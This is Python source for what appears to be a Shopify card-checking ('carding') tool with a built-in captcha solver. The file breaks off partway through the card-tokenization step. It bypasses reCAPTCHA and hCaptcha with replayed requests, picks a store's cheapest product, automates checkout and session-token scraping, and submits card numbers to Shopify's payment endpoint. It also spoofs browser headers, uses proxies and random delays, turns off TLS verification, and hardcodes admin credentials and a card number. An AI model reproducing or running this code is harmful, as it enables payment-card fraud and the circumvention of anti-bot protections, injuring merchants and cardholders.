"""
CxC AutoShopify Checker with Integrated Captcha Solver
Integrates Shopify Captcha Solver API for automatic captcha handling
Support: https://t.me/streetfind
"""

from flask import Flask, jsonify, request, render_template, redirect
import requests
import json
import uuid
import time
import random
import re
import urllib3
import sys
import logging
import os
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET
import hashlib
from datetime import datetime, timedelta

# Try to import JWT (optional for admin auth)
try:
    import jwt
    JWT_AVAILABLE = True
except:
    JWT_AVAILABLE = False
    print("⚠️ PyJWT not installed - admin auth will use session-based auth")

# Try to import browser solver (optional)
try:
    from browser_captcha_solver import BrowserCaptchaSolver
    BROWSER_SOLVER_AVAILABLE = True
except:
    BROWSER_SOLVER_AVAILABLE = False
    print("⚠️ Browser solver not available - install with: pip install selenium")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# Configure logging FIRST
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Admin configuration
ADMIN_USERNAME = "databasemanaging"
ADMIN_PASSWORD = "41Ars@117"
SECRET_KEY = os.urandom(24).hex()  # Generate random secret key

# In-memory log storage
system_logs = []
MAX_LOGS = 1000  # Keep last 1000 logs

def add_log(level, message, details=None):
    """Add a log entry"""
    log_entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "level": level,
        "message": message,
        "details": details
    }
    system_logs.append(log_entry)
    # Keep only last MAX_LOGS entries
    if len(system_logs) > MAX_LOGS:
        system_logs.pop(0)
    # Also print to console
    try:
        if level == "ERROR":
            logger.error(f"{message} - {details}")
        elif level == "WARNING":
            logger.warning(f"{message} - {details}")
        else:
            logger.info(f"{message} - {details}")
    except:
        pass  # Ignore if logger not ready yet

# Add startup log (after logger is configured)
add_log("INFO", "System starting", {"version": "1.0.0"})

# ============================================
# CAPTCHA SOLVER INTEGRATION (BUILT-IN - NO EXTERNAL API)
# ============================================

CAPTCHA_SOLVER_ENABLED = True
MAX_CAPTCHA_RETRIES = 3
CAPTCHA_RETRY_DELAY = 2

# Log system ready
add_log("INFO", "System ready", {"captcha_solver": CAPTCHA_SOLVER_ENABLED, "jwt_available": JWT_AVAILABLE})

def detect_site_key_from_page(store_url, timeout=10):
    """Detect captcha site key from store page (checkout page for better detection)"""
    try:
        if not store_url.startswith(('http://', 'https://')):
            store_url = 'https://' + store_url

        # Check checkout page first (most likely to have captcha)
        paths_to_check = [
            '/checkout',
            '/cart',
            '/account/login',
            '/account/register',
            '',  # homepage as fallback
            '/pages/contact'
        ]
        session = requests.Session()
        session.verify = False

        for path in paths_to_check:
            try:
                url = urljoin(store_url, path)
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
                response = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                if response.status_code == 200:
                    result = parse_captcha_from_html(response.text, store_url)
                    if result and result.get('success'):
                        session.close()
                        return result
            except Exception as e:
                continue

        session.close()
        
        # If no site key found in HTML, use primary Shopify key as fallback
        # This handles server-side captcha enforcement
        logger.info(f"⚠️ No captcha site key found in HTML, using Shopify default key")
        return {"success": True, "site_key": SHOPIFY_RECAPTCHA_KEYS[0], "captcha_type": "recaptcha", "fallback": True}
        
    except Exception as e:
        logger.error(f"Site key detection error: {e}")

    return {"success": False}


def parse_captcha_from_html(html_content, base_url=""):
    """Parse captcha info from HTML"""
    try:
        # Check for reCAPTCHA
        recaptcha_patterns = [
            r'data-sitekey=["\']([a-zA-Z0-9_-]{40})["\']',
            r'recaptcha/sitekey["\']?\s*:\s*["\']([a-zA-Z0-9_-]{40})["\']',
            r'google\.com/recaptcha/api.*?k=([a-zA-Z0-9_-]{40})',
            r'js\?k=([a-zA-Z0-9_-]{40})',
            r'api\.js\?render=explicit&k=([a-zA-Z0-9_-]{40})',
        ]

        for pattern in recaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 40 and site_key.startswith('6L'):
                    logger.info(f"🎯 Found reCAPTCHA site key: {site_key[:20]}...")
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "recaptcha",
                        "detection_method": "html_parse"
                    }

        # Check for hCaptcha
        hcaptcha_patterns = [
            r'data-sitekey=["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']',
            r'hcaptcha\.com.*?sitekey=["\']([a-f0-9-]{36})["\']',
            r'hcaptcha/([a-f0-9-]{36})',
        ]

        for pattern in hcaptcha_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                if len(site_key) == 36 and site_key.count('-') == 4:
                    logger.info(f"🎯 Found hCaptcha site key: {site_key}")
                    return {
                        "success": True,
                        "site_key": site_key,
                        "captcha_type": "hcaptcha",
                        "detection_method": "html_parse"
                    }
        
        # Check for Cloudflare Turnstile
        turnstile_patterns = [
            r'data-sitekey=["\']([0-9x]+AA)["\']',
            r'challenges\.cloudflare\.com.*?sitekey=["\']([0-9x]+AA)["\']',
        ]
        
        for pattern in turnstile_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            if matches:
                site_key = matches[0]
                logger.info(f"🎯 Found Turnstile site key: {site_key}")
                return {
                    "success": True,
                    "site_key": site_key,
                    "captcha_type": "turnstile",
                    "detection_method": "html_parse"
                }
    except Exception as e:
        logger.error(f"Parse HTML error: {e}")

    return {"success": False}


def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True, max_retries=5):
    """
    Solve reCAPTCHA v2 using the bot's working code
    """
    start_time = time.time()
    
    for attempt in range(max_retries):
        try:
            # Your exact captcha solving code
            anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d&co=aHR0cHM6Ly93d3cucHl0aG9uYW55d2hlcmUuY29tOjQ0Mw..&hl=en&v=V6_85qpc2Xf2sbe3xTnRte7m&size=invisible&cb=7bfpis1umopm"
            reload_url = "https://www.google.com/recaptcha/api2/reload?k=6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d"

            session = requests.Session()
            session.verify = False
            
            response = session.get(anchor_url)
            token = str(response.text).partition(str('id="recaptcha-token" value="'))[-1].partition(str('">'))[0]
            
            if not token or len(token) < 10:
                logger.warning(f"⚠️ Failed to extract token from anchor page")
                if attempt < max_retries - 1:
                    time.sleep(2)
                continue
            
            post = session.post(reload_url, data=f"v=UFwvoDBMjc8LiYc1DKXiAomK&reason=q&c={token}&k=6Lc4FowfAAAAAPiXf6lyEPAe_84kesFIGdJUdRTe&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B61%2C36%2C84%5D&vh=7349404152&bg=!d3GgcVjIAAX6VNIG-kc72sZkL7AELV23BHEg3iiH1gcAAADHVwAAAAttAQecCimhpOYJBHsHw4TnDQnJAUU1KJWxkMVvr9kGAhPbfpEnRsIzZxDoK8WNA4Xk_jX6YLNl5cj97gy8xe0qj2UogYjr5xxWaD7OHCEWXqDqFHo9zQkvm1Jr-3PhDQbPfdz_WeOLnRGfdAlF7f6kTVJj8r_mdAx3g-11hZ4fXQpAMZ0qWUVIHOx4N86v_InW_G-9vhB6bzY_Xg1rQvsjsor6h9-BUi6cUZMmvYAn78v7JLBPZSdpWYD285rwy35stcDw5cYF8ruxzI_IqsNA6NAZWA4k1n-PuM5pxQDzLsrkD5oXB839hlcFKldmlsFx074KtmlcmvUVrD2O4Q8hNqjNTjRDSRqfZzcChfvqRKsx1DyhuXnz5dYAAR1ASd47CXlwOBdU6gCke1gRtLFtfSBMDvrhg7jK3uVK3jM-0q66IZwyUZHosVS0tI6DRRdXK6owLFJZi3lLnBzbASXdOaUGQHrzDFjQAbU76NE-neuga0bExaNraPqN0wYUBz1D0IPJ5kYLPQNArW2Z9a-to_yP1Oo7IDJlty6h9jTS7D32mQinK7JskejX_kPrchsfCCmNTQVmzSVnky-3WK4okaHXDKe9EHTTD2q5yQMRKNhHiHhifVwZ7fbBuaAP36m2qOxSrjrz6Em_HkCqAQb5GArJCVq7w04FuDxW7AGg086NIlp5QkST-AkJjCxn9BnV_5_37x_K8-vkMgIgND-pOet9HMf-4yrI7QrI8odYI9mmdEHwlSbKyWBkfnWFhTTL096dlgvDsNIiPoYIqdSjRAc1hkb2ToGqHTKD9VsfpcH79bBg_reEC7EK2ifubkSRhmz_LGhlN5wRTr_DuhjO0_pH8-TGKDCLlQJQ-jWC97z979drLh97I6wuXroq3xwfymQ9iDs2glksEExM78hbfVQsdRhLiUtDFkYxjinFEb325zUQJR6xT-yXNcLfLwDLWwfL6nuLS14IXKmENSW-6OIkXXJyDhgUKW6B1Reyll5b1s9A7OpsAtQH6H5rQzm6422zF12dO9JODF4UErQv43JpQu_wYG-VRUwGWcHvcrG9vp1c8mXjNfxoE2Ok0tTNXQXLr1DacKk4mG2YZF7X8xkPjDqW1XH6w8kde64MoCbMlc2u4yv9x-44P2XXMCDppFLsRLekxW00kAXP__rWpvNoEtt4PbI_Y_d9-lSLd6WDQ5mZObuIdo6BAS095B443-CNTb_4IAp9-4puXY_WU1cbkvt0hsV9iFjkcbsjAw1xmwBZoVg1ukewp4kPWL-oVVlGJYuQm_7AvAjZ6nRIRv_f7KebJQr-bY6wD3asqUzEZ8DHOLUJeScIFtDTFzAg9SxkP1dYde7y9umqn3a_3OyFR6iulqy-c0LoULRNh1DXG4KXKaabC4f7cixdSWPazY58wiic3ysahAsbaFGv_LzwFCy7uP0M7zKiwadGSOH_gaROuLTHbRnbEvPAgaa3zyP9mFPNhy_AsgKOAy5iA4l9qaBiVXwrWpXVyuQgsliVcmpeLSrMg9fpbb7LGcLv9dz5LxUetPIDUndRuJnW6xCyNakiVQMy6vF9l9qkEoHRjua7sPWZnJC29zjHdTgEVy5SOKinYGOBs1GlCFSSyIjBWixBWXH83hCjdd3TDJjQsNtDsRMr8mVlyiEqKkIttz1-2mV2ZhA6FmJ3Ldm-tnlQN5iaIM40HKbbrHDuDKWhdWXsouO2BfLJxDDvu--e251eTYOuFIHRQzCUg-y4LddffPqdFpemjCsJC1xHTx2DQXZTdQTv9n0FK9GTwRizJxnYqn5lDoXZv4MtG4tSZFjx8U9KnNBApFcDXXfFeymVWT5miPlimr9zSBRGEdzCAv-NctpVXrSwd3Yzpsj_eGFT91owgeAzjOnPFWMod2XCZbEywubJI-0QsHFxwiGbsnXtV2fXQOzdpdQKVcynj7gQhIJHQogB0M4achR6TmT-7dRvNkffa17qyRqpoIXhbpbvC9cgQG4VQaYjlhpeiWNHM7uTW1-5cdkZOcVqxsU5c1fzMpv77BuRYm--EJpFZSfsihySlvcGWVnz1qS-deD4gGUa8un8j3v0-YAu4llS6vC9OpCb-khnh7SgHk-a19cLD9m6mXVu9EJlV2gbdMcKouobkIljeKBT6ivhkemTe_peKfgDjgFSJfJ7Hxey2LR7nG1YW2FVv6kAOPRfoHNUf2OEvUHcvZ00jc7nJZTfrt-8nmutFD9C59MQ5HWvtIK5XobaAxyunaZon6iZxiFFRDo2o-xl6TwCuHYvmVWl6mAr5kn5QDlclIKc6hrIq8osYCcukWMZhu7L9wsyVMy1WC2GhXdWlTZnaJjqLtGBsxaTCbzND4nZ0zGEsGMX180J-y1PQ3EY3nP0e4ToqO8rXPi6lZ4GmGTpm0XypZ0jkf1xnU1FacQhmpVmIKru8kbjjChfywMM2exkn3E7CINxQS77i81vn3c8fWcdvKQ9lVProo60Yzea7RpjOdnfk9T4CcjV-J941093qAttWyknhB661xBQCzOXFB0euSb8Jn-J_5tSgX4NE1AyNXQEA5wk6km6tT3UUyK3yTEn8oynK_FZz_p4W4BGy_sCUm0IG43ioT-17L2CoQAzk2ZE5g4eh7jkASVHBeXREbMWtB4YdO-gPwxIrWVVOiN57jSDi5yM08wgBqKeAVYLHXFFuUG7konyayI7tTwxYjN0j7T9nGR2Jh1wmA-q99D4tbsM2AvWIWn9j3g83JBF4nqzS4lt72WUpL3kAdbOz2xwRKaWLFaEsaM9jQeg2ijJpTNqRlKxtXneWqjkca5JZCZEmGCbplWJAEARNOEVHWd00dc2dCt8KEHiBiAP86L6loq_QvD-kbLd1bd9S8FqCMVFRcOwOOBvUEBm1D-mJiA2KWBJ9T87kcAQmLRQxrTuGHMojr9cBtKz-2afsMXRPoCPmRc-dDwiYOXUgdERgEH6lifStYMTZcjS66GGA-0UccFdY2yAl7TG6b3lDa-lbTwSJHESj_UrH3neTMf2U8Z6rFWsTIHa5XfQ8nFacgUyokFLtzxGH57QQqRUc0bfqEouu_o8S0galOM1p2uaZqrrdvAbq31i-xMU5CqW0_WVG3REfA6SY0CJLXOs8mzwGFgZJEpr374MMRL6JEUu7qd_jib4P9-O8pvKFk7tfPTccXWq12b1gj7SsA6sdeffMMG1gpD-kYGud8ghD6x9sevkZ-IRveRZQmUCqXvT6rl-YOfyBTDsv2vpqD1kXxGSNV206XBFw6bFQB583TBhFWfm3p6nc1s3p-KY4oIMR1l6Z5Ccfh7CWv7EYNkbjwfsrk1PXoI38vy4cT8ttz49TQ5WSPSBgeZuAKUlX0Hml2C2xtis_a3YABvB4UsJK65Rg7hQCWLAlX8HYLeVYiUiqh31LE5JUPayYiC0nxQADw7A6-6hFtJqQz84LrxMw7a-Q59R0VwCqWGfCebmRh_BVlg", headers={
                "content-type": "application/x-www-form-urlencoded"
            })
            
            captcha_token = str(post.text.split('"rresp","')[1].split('"')[0])
            
            if captcha_token and len(captcha_token) > 10:
                session.close()
                logger.info(f"✅ Captcha solved on attempt {attempt + 1}")
                return {
                    "success": True,
                    "token": captcha_token,
                    "site_key": site_key,
                    "page_url": page_url,
                    "captcha_type": "recaptcha",
                    "time_taken": round(time.time() - start_time, 2),
                    "attempt": attempt + 1
                }
            
            session.close()
            
            if attempt < max_retries - 1:
                time.sleep(2)
                
        except Exception as e:
            logger.error(f"Captcha solve attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2)
                continue

    return {
        "success": False,
        "error": "All retry attempts failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
    """Solve hCaptcha"""
    start_time = time.time()

    for attempt in range(max_retries):
        try:
            session = requests.Session()
            session.verify = False
            response = session.post(
                "https://hcaptcha.com/getcaptcha",
                data={
                    "sitekey": site_key,
                    "host": page_url,
                    "hl": "en",
                    "v": "1",
                    "swa": "1"
                },
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=15
            )

            if response.status_code == 200:
                result = response.json()
                if "key" in result or "token" in result:
                    session.close()
                    return {
                        "success": True,
                        "token": result.get("key") or result.get("token"),
                        "site_key": site_key,
                        "page_url": page_url,
                        "captcha_type": "hcaptcha",
                        "time_taken": round(time.time() - start_time, 2),
                        "attempt": attempt + 1
                    }

            session.close()

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue

    return {
        "success": False,
        "error": "hCaptcha solving failed",
        "time_taken": round(time.time() - start_time, 2)
    }


def solve_captcha_auto(shop_url, max_retries=3):
    """
    Auto-detect and solve captcha (BUILT-IN - NO EXTERNAL API)
    Returns captcha token if successful, None if failed
    """
    if not CAPTCHA_SOLVER_ENABLED:
        return None

    for attempt in range(max_retries):
        try:
            # Step 1: Detect site key from page
            detection_result = detect_site_key_from_page(shop_url)

            if not detection_result.get('success'):
                logger.warning(f"⚠️ Could not detect captcha type (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(CAPTCHA_RETRY_DELAY)
                continue

            captcha_type = detection_result.get('captcha_type', 'recaptcha')
            site_key = detection_result.get('site_key')

            logger.info(f"✅ Detected {captcha_type} with site key: {site_key[:20]}...")

            # Step 2: Solve based on captcha type
            if captcha_type == 'recaptcha':
                solve_result = solve_recaptcha_v2(site_key, shop_url)
            elif captcha_type == 'hcaptcha':
                solve_result = solve_hcaptcha(site_key, shop_url)
            else:
                logger.warning(f"⚠️ Unsupported captcha type: {captcha_type}")
                if attempt < max_retries - 1:
                    time.sleep(CAPTCHA_RETRY_DELAY)
                continue

            if solve_result.get('success'):
                logger.info(f"✅ Captcha solved in {solve_result.get('time_taken', 'N/A')}s")
                return solve_result.get('token')
            else:
                logger.warning(f"⚠️ Captcha solve failed: {solve_result.get('error', 'Unknown')}")

            if attempt < max_retries - 1:
                time.sleep(CAPTCHA_RETRY_DELAY)

        except Exception as e:
            logger.error(f"❌ Captcha solving error: {e}")
            if attempt < max_retries - 1:
                time.sleep(CAPTCHA_RETRY_DELAY)

    return None

# ============================================
# CHECKER CONFIGURATION
# ============================================

# Global variables for checkout flow (set in process_checkout)
SHOP_URL = ""
VARIANT_ID = ""

# Additional configuration
SUMMARY_ONLY = False

# Common Shopify reCAPTCHA site keys (fallback when not detected)
SHOPIFY_RECAPTCHA_KEYS = [
    "6LfLB8oZAAAAACdFNV7uq5znzqoNt2-VYujiN15d",  # Primary Shopify key
    "6Lc4FowfAAAAAPiXf6lyEPAe_84kesFIGdJUdRTe",  # Common Shopify key
]

def ordinal(n):
    """Convert number to ordinal string"""
    if 11 <= (n % 100) <= 13:
        suffix = 'th'
    else:
        suffix = {1: 'st', 2: 'nd', 3: 'rd'}.get(n % 10, 'th')
    return str(n) + suffix

FAST_MODE = False
POLL_RECEIPT_MAX_ATTEMPTS = 10
SHORT_SLEEP = 3.0
MAX_WAIT_SECONDS = 8.0
HTTP_TIMEOUT_SHORT = 15
HTTP_TIMEOUT_MEDIUM = 20
STOP_AFTER_FIRST_RESULT = False
SINGLE_PROXY_ATTEMPT = True

CHECKOUT_DATA = {
    "email": "test@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "address1": "4024 College Point Boulevard",
    "city": "Flushing",
    "province": "NY",
    "zip": "11354",
    "country": "US",
    "phone": "2494851515",
    "coordinates": {
        "latitude": 40.7589,
        "longitude": -73.9851
    }
}

CARD_DATA = {
    "number": "4342580222985194",
    "month": 4,
    "year": 2028,
    "verification_value": "000",
    "name": "Test Card"
}

def create_session(shop_url, proxies=None):
    session = requests.Session()
    session.trust_env = False if proxies else True
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    })
    if proxies:
        try:
            session.proxies.update(proxies)
        except Exception:
            pass
    return session

def normalize_shop_url(shop_url):
    if not shop_url.startswith(('http://', 'https://')):
        shop_url = f"https://{shop_url}"
    return shop_url

def get_minimum_price_product_details(json_data=None):
    valid_products = []
    
    if json_data:
        try:
            products = json_data if isinstance(json_data, list) else json_data.get('products', [])
            
            for product in products:
                product_id = product.get('id')
                product_title = product.get('title', 'Unknown')
                variants = product.get('variants', [])
                
                for variant in variants:
                    variant_id = variant.get('id')
                    price_str = variant.get('price', '0')
                    available = variant.get('available', False)
                    
                    try:
                        price = float(price_str)
                        
                        if available and price > 0:
                            valid_products.append({
                                'id': str(product_id),
                                'variant_id': str(variant_id),
                                'price': price,
                                'price_str': price_str,
                                'title': product_title,
                                'available': True
                            })
                    except (ValueError, TypeError):
                        continue
            
            if valid_products:
                valid_products.sort(key=lambda x: x['price'])
                return valid_products[0]
                
        except Exception as e:
            print(f"  [DEBUG] JSON parsing error: {e}")
    
    return None

def auto_detect_cheapest_product(session, shop_url):
    print("[0/5] Auto-detecting cheapest product...")
    
    time.sleep(random.uniform(0.5, 1.5))

    all_found_products = []

    def choose_from_products_list(products, collect_all=False):
        valid_candidates = []
        
        for product in products or []:
            try:
                pt = product.get('title') or 'Unknown'
                pid = str(product.get('id') or "")
                variants = product.get('variants') or []
                for v in variants:
                    vid = str(v.get('id') or "")
                    price_str = str(v.get('price') or v.get('price_amount') or "0")
                    try:
                        price = float(price_str)
                    except Exception:
                        continue
                    
                    if price <= 0:
                        continue
                    
                    available = v.get('available', None)
                    if available is None:
                        inv_q = v.get('inventory_quantity')
                        inv_pol = (v.get('inventory_policy') or "").lower()
                        available = (isinstance(inv_q, (int, float)) and inv_q > 0) or inv_pol == "continue"
                    if not available:
                        continue
                    
                    candidate = (pid, vid, price, price_str, pt)
                    valid_candidates.append(candidate)
                    if collect_all:
                        all_found_products.append(candidate)
            except Exception:
                continue
        
        if valid_candidates:
            valid_candidates.sort(key=lambda x: x[2])
            return valid_candidates[0]
        
        return None

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via products.json: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    try:
        time.sleep(random.uniform(0.3, 0.8))
        url = f"{shop_url}/collections/all/products.json?limit=250"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200:
            data = r.json()
            products = data if isinstance(data, list) else data.get('products', [])
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via collections/all: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass


    if FAST_MODE:
        print("  [FAST] Skipping slow sitemap/predictive search in FAST_MODE")
        if all_found_products:
            random_product = random.choice(all_found_products)
            pid, vid, price, price_str, title = random_product
            print(f"  🎲 Random product selected (FAST_MODE): {title} ${price_str}")
            return pid, vid, price_str, title
        return None, None, None, None


    handles = []
    try:
        url = f"{shop_url}/sitemap_products_1.xml"
        r = session.get(url, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        if r.status_code == 200 and r.text:
            try:
                root = ET.fromstring(r.text)
                ns = {'sm': 'http://www.sitemaps.org/schemas/sitemap/0.9'}
                for loc in root.findall('.//sm:url/sm:loc', ns):
                    loc_text = (loc.text or "").strip()
                    if not loc_text:
                        continue
                    m = re.search(r"/products/([^/?#]+)", loc_text)
                    if m:
                        handles.append(m.group(1))
                    if len(handles) >= 10:
                        break
            except Exception:
                pass
    except Exception:
        pass

    best = None
    for handle in handles:
        try:
            url = f"{shop_url}/products/{handle}.js"
            r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
            if r.status_code != 200:
                continue
            data = r.json()
            product = {
                "id": data.get('id'),
                "title": data.get('title'),
                "variants": data.get('variants', [])
            }
            cand = choose_from_products_list([product], collect_all=True)
            if cand and ((best is None) or cand[2] < best[2]):
                best = cand
        except Exception:
            continue
    if best:
        pid, vid, price, price_str, title = best
        print(f"  ✅ Cheapest product found via sitemap: {title} ${price_str}")
        return pid, vid, price_str, title

    try:
        url = f"{shop_url}/search/suggest.json?q=a&resources[type]=product&resources[limit]=10"
        r = session.get(url, timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
        if r.status_code == 200:
            data = r.json()
            res = data.get('resources', {}).get('results', {}).get('products', []) if isinstance(data, dict) else []
            products = []
            for p in res:
                handle = p.get('handle')
                if not handle:
                    continue
                try:
                    pr = session.get(f"{shop_url}/products/{handle}.js", timeout=HTTP_TIMEOUT_MEDIUM, verify=False)
                    if pr.status_code != 200:
                        continue
                    pdata = pr.json()
                    products.append({
                        "id": pdata.get('id'),
                        "title": pdata.get('title'),
                        "variants": pdata.get('variants', [])
                    })
                except Exception:
                    continue
            best = choose_from_products_list(products, collect_all=True)
            if best:
                pid, vid, price, price_str, title = best
                print(f"  ✅ Cheapest product found via predictive search: {title} ${price_str}")
                return pid, vid, price_str, title
    except Exception:
        pass

    if all_found_products:
        random_product = random.choice(all_found_products)
        pid, vid, price, price_str, title = random_product
        print(f"  🎲 Random product selected (fallback): {title} ${price_str}")
        return pid, vid, price_str, title

    print(f"  ❌ Could not auto-detect any products")
    return None, None, None, None

def step1_add_to_cart(session, shop_url, variant_id):
    print("[1/5] Adding to cart and creating checkout...")

    add_url = f"{shop_url}/cart/add.js"
    payload = {"id": variant_id, "quantity": 1}

    try:
        r = session.post(add_url, json=payload, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        print(f"  Add to cart: {r.status_code}")
    except Exception as e:
        print(f"  [ERROR] Add to cart request failed: {e}")
        raise

    checkout_url = f"{shop_url}/checkout"
    try:
        r = session.get(checkout_url, allow_redirects=True, timeout=HTTP_TIMEOUT_SHORT, verify=False)
    except Exception as e:
        print(f"  [ERROR] Checkout init request failed: {e}")
        raise

    # Check if captcha might be required (aggressive detection)
    if CAPTCHA_SOLVER_ENABLED:
        # Check for reCAPTCHA site key (40 chars starting with 6L)
        recaptcha_key_match = re.search(r'data-sitekey=["\']([a-zA-Z0-9_-]{40})["\']', r.text)
        # Check for hCaptcha site key (UUID format)
        hcaptcha_key_match = re.search(r'data-sitekey=["\']([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})["\']', r.text, re.IGNORECASE)
        
        # Always try to solve captcha if any captcha-related content is found
        has_captcha_content = (
            'recaptcha' in r.text.lower() or 
            'hcaptcha' in r.text.lower() or 
            'captcha' in r.text.lower() or
            recaptcha_key_match or 
            hcaptcha_key_match
        )
        
        if has_captcha_content:
            print("\n[CAPTCHA] 🚨 Captcha detected on checkout page!")
            print("[CAPTCHA] Solving captcha...")
            captcha_token = solve_captcha_auto(shop_url, max_retries=MAX_CAPTCHA_RETRIES)
            if captcha_token:
                print(f"[CAPTCHA] ✅ Captcha solved successfully! Token: {captcha_token[:30]}...")
                # Store captcha token in session for later use
                session.cookies.set('_captcha_token', captcha_token)
            else:
                print("[CAPTCHA] ⚠️ Captcha solving failed, continuing anyway...")

    final_url = r.url
    if '/checkouts/cn/' in final_url:
        checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
        print(f"  [OK] Checkout token: {checkout_token}")

        meta_data = extract_checkout_meta_data(r.text)
        session_token = meta_data['session_token']
        stable_id = meta_data['stable_id']
        payment_method_id = meta_data['payment_method_id']

        return checkout_token, session_token, r.cookies, stable_id, payment_method_id

    return None, None, None, None, None

def extract_checkout_meta_data(html):
    from html import unescape
    data = {
        'session_token': None,
        'stable_id': None,
        'payment_method_id': None,
        'queue_token': None
    }
    
    # 1. Session Token
    patterns_session = [
        r'<meta\s+name="serialized-sessionToken"\s+content="([^"]+)"',
        r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"',
        r'<meta\s+content="([^"]+)"\s+name="serialized-session-token"',
        r'"serialized-sessionToken"\s+content="([^"]+)"',
        r'"serialized-session-token"\s+content="([^"]+)"',
        r'content="([^"]+)"\s+name="serialized-session-token"'
    ]
    for pat in patterns_session:
        m = re.search(pat, html)
        if m:
            content = unescape(m.group(1))
            token = content.strip('"')
            if len(token) > 20:
                data['session_token'] = token
                break
    
    if not data['session_token']:
         print("  [WARNING] Session token not found")

    # 2. Stable ID
    patterns_stable = [
        r'stableId&quot;:&quot;([^&]+)&quot;',
        r'"stableId":"([^"]+)"',
        r'stableId":"([^"]+)"'
    ]
    for pat in patterns_stable:
        m = re.search(pat, html)
        if m:
            data['stable_id'] = unescape(m.group(1))
            print(f"  [OK] Found Stable ID: {data['stable_id'][:20]}...")
            break

    # 3. Payment Method Identifier
    patterns_pm = [
        r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;',
        r'"paymentMethodIdentifier":"([^"]+)"',
        r'paymentMethodIdentifier":"([^"]+)"'
    ]
    for pat in patterns_pm:
        m = re.search(pat, html)
        if m:
            data['payment_method_id'] = unescape(m.group(1))
            print(f"  [OK] Found Payment ID: {data['payment_method_id'][:20]}...")
            break
    
    if not data['payment_method_id']:
        print("  [WARNING] Payment Method Identifier not found in HTML")
            
    # 4. Queue Token (fallback)
    patterns_qt = [
        r'queueToken&quot;:&quot;([^&]+)&quot;',
        r'"queueToken":"([^"]+)"',
        r'queueToken":"([^"]+)"'
    ]
    for pat in patterns_qt:
        m = re.search(pat, html)
        if m:
            data['queue_token'] = unescape(m.group(1))
            break

    return data

def step2_tokenize_card(session, checkout_token, shop_url, card_data):
    print("[2/5] Tokenizing credit card...")
    
    time.sleep(random.uniform(1.2, 2.0))

    try:
        scope_host = urlparse(shop_url).netloc or shop_url.replace('https://', '').replace('http://', '').split('/')[0]
    except Exception:
        scope_host = shop_url.replace('https://', '').replace('http://', '').split('/')[0]

    payload = {
        "credit_card": {
            "number": card_data["number"],
            "month": card_data["month"],
            "year": card_data["year"],
            "verification_value": card_data["verification_value"],
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_data["name"]
        },
        "payment_session_scope": scope_host
    }

    endpoints = [
        ("https://checkout.pci.shopifyinc.com/sessions", "https://checkout.pci.shopifyinc.com", "https://checkout.pci.shopifyinc.com/"),
    ]

    last_status = None
    last_text_head = None

    for ep_url, origin, referer in endpoints:
        headers = {
            "Origin": origin,
            "Referer": referer,
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Sec-CH-UA": '"Chromium";v="129", "Google Chrome";v="129", "Not=A?Brand";v="99"',
